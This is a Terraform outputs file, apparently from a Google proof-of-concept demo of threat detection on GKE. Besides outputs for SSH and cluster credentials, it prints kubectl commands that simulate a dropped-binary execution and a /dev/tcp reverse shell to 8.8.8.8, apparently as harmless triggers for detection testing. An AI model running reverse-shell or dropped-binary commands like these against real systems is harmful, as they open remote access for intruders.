/**
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


## NOTE: This provides PoC demo environment for various use cases ##
##  This is not built for production workload ##


output "_01_core_project_infra_mod_id" {
  value = google_project.demo_project.project_id
}

output "_02_iap_ssh_gke_proxy" {
  value = "gcloud compute ssh --zone ${var.network_zone} ${google_compute_instance.kubernetes_proxy_server.name}  --tunnel-through-iap --project ${google_project.demo_project.project_id}"
}


output "_03_gke_get_credential" {
  value = "gcloud container clusters get-credentials ${local.cluster_name} --zone=us-east1 --project=${var.demo_project_id}${random_string.id.result};export USE_GKE_GCLOUD_AUTH_PLUGIN=True"
}


output "_04_binary_executed_attack" {
  value = "kubectl run --restart=Never --rm=true --wait=true -i  --image marketplace.gcr.io/google/ubuntu1804:latest dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c 'cp /bin/ls /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc); /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)'"
}


output "_05_reverse_shell" {
  value = "kubectl run --restart=Never --rm=true --wait=true -i  --image marketplace.gcr.io/google/ubuntu1804:latest reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c '/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1'"
}


